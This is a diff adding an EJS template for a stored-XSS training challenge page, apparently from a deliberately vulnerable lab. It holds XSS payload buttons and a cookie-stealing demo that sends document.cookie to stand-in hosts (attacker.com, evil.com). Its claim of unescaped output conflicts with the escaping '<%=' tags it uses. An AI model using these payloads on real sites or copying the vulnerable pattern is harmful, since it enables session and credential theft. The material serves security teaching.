@@ -1,0 +1,157 @@
+<div class="challenge-container">
+    <div class="challenge-header">
+        <h1><i class="fas fa-database"></i> Stored XSS Challenge</h1>
+        <div class="challenge-meta">
+            <span class="badge badge-medium">Difficulty: Medium</span>
+            <span class="badge badge-warning">Persistent</span>
+        </div>
+    </div>
+
+    <div class="challenge-description">
+        <h2><i class="fas fa-info-circle"></i> Description</h2>
+        <p>Stored XSS (Persistent XSS) occurs when user input is stored on the server (in a database, file system, etc.) and then displayed to other users without proper sanitization. This is the most dangerous type of XSS as it affects multiple users and can persist for a long time.</p>
+        
+        <div class="vulnerable-code">
+            <h4><i class="fas fa-code"></i> Vulnerable Code Pattern:</h4>
+            <pre><code>// Backend - Storing unsanitized input
+app.post('/comment', (req, res) => {
+    const comment = req.body.comment;
+    // NO sanitization before storing
+    db.query('INSERT INTO comments VALUES (?)', [comment]);
+});
+
+// Frontend - Displaying without encoding
+&lt;div class="comments"&gt;
+    &lt;%= comment.content %&gt;  &lt;!-- No HTML escaping! --&gt;
+&lt;/div&gt;</code></pre>
+        </div>
+    </div>
+
+    <div class="hints">
+        <h3><i class="fas fa-lightbulb"></i> Hints</h3>
+        <ul>
+            <% hints.forEach(hint => { %>
+            <li><%= hint %></li>
+            <% }); %>
+        </ul>
+    </div>
+
+    <div class="challenge-sections">
+        <div class="section">
+            <h3><i class="fas fa-comment"></i> Post a Comment (Vulnerable)</h3>
+            <form action="/stored/comment" method="POST" class="vulnerable-form">
+                <div class="form-group">
+                    <label for="username">Username:</label>
+                    <input type="text" id="username" name="username" class="form-control" 
+                           placeholder="Anonymous" value="Hacker">
+                </div>
+                <div class="form-group">
+                    <label for="comment">Comment:</label>
+                    <textarea id="comment" name="comment" class="form-control" rows="4" 
+                              placeholder="Try XSS payloads here..."></textarea>
+                </div>
+                <div class="payload-suggestions">
+                    <strong>Try these payloads:</strong>
+                    <div class="payload-buttons">
+                        <button type="button" onclick="setPayload('<script>alert(\"Stored XSS\")</script>')" 
+                                class="btn btn-sm btn-outline">
+                            Basic Script
+                        </button>
+                        <button type="button" onclick="setPayload('<img src=x onerror=alert(document.cookie)>')" 
+                                class="btn btn-sm btn-outline">
+                            Steal Cookies
+                        </button>
+                        <button type="button" onclick="setPayload('<iframe src=javascript:alert(1)>')" 
+                                class="btn btn-sm btn-outline">
+                            Iframe
+                        </button>
+                        <button type="button" onclick="setPayload('<svg onload=alert(1)></svg>')" 
+                                class="btn btn-sm btn-outline">
+                            SVG
+                        </button>
+                    </div>
+                </div>
+                <button type="submit" class="btn btn-primary">
+                    <i class="fas fa-paper-plane"></i> Post Comment
+                </button>
+            </form>
+        </div>
+
+        <div class="section">
+            <h3><i class="fas fa-comments"></i> Comments Feed (Vulnerable Display)</h3>
+            <div class="comments-section">
+                <% if (comments.length === 0) { %>
+                    <p class="no-comments">No comments yet. Be the first to post!</p>
+                <% } else { %>
+                    <div class="comments-list">
+                        <% comments.forEach(comment => { %>
+                        <div class="comment-card <%= comment.is_admin ? 'admin-comment' : '' %>">
+                            <div class="comment-header">
+                                <span class="comment-author">
+                                    <i class="fas fa-user"></i> 
+                                    <%= comment.username %>
+                                    <% if (comment.is_admin) { %>
+                                    <span class="badge badge-admin">Admin</span>
+                                    <% } %>
+                                </span>
+                                <span class="comment-date">
+                                    <%= new Date(comment.created_at).toLocaleString() %>
+                                </span>
+                                <form action="/stored/delete/<%= comment.id %>" method="POST" 
+                                      class="delete-form" style="display: inline;">
+                                    <button type="submit" class="btn btn-sm btn-danger">
+                                        <i class="fas fa-trash"></i>
+                                    </button>
+                                </form>
+                            </div>
+                            <div class="comment-body">
+                                <!-- INTENTIONALLY VULNERABLE: No HTML escaping -->
+                                <%= comment.content %>
+                            </div>
+                            <div class="comment-raw">
+                                <small>Raw content: <code><%= comment.content %></code></small>
+                            </div>
+                        </div>
+                        <% }); %>
+                    </div>
+                <% } %>
+            </div>
+        </div>
+
+        <div class="section">
+            <h3><i class="fas fa-eye"></i> View Raw Comments</h3>
+            <p>See how comments are stored and rendered:</p>
+            <a href="/stored/admin-view" class="btn btn-secondary">
+                <i class="fas fa-code"></i> Admin View (Raw HTML)
+            </a>
+        </div>
+
+        <div class="section">
+            <h3><i class="fas fa-cookie-bite"></i> Cookie Stealing Demo</h3>
+            <p>Example payload to steal cookies:</p>
+            <div class="payload-demo">
+                <pre><code>&lt;script&gt;
+fetch('https://attacker.com/steal?cookie=' + document.cookie);
+&lt;/script&gt;</code></pre>
+                <p>Or:</p>
+                <pre><code>&lt;img src=x onerror="this.src='http://evil.com/?c='+document.cookie"&gt;</code></pre>
+            </div>
+        </div>
+    </div>
+
+    <div class="warning-box">
+        <h4><i class="fas fa-exclamation-triangle"></i> Security Implications</h4>
+        <ul>
+            <li>Affects all users viewing the page</li>
+            <li>Can persist for months or years</li>
+            <li>Can be used to steal sessions, credentials, and personal data</li>
+            <li>Can deface websites or redirect users</li>
+        </ul>
+    </div>
+</div>
+
+<script>
+function setPayload(payload) {
+    document.getElementById('comment').value = payload;
+}
+</script>
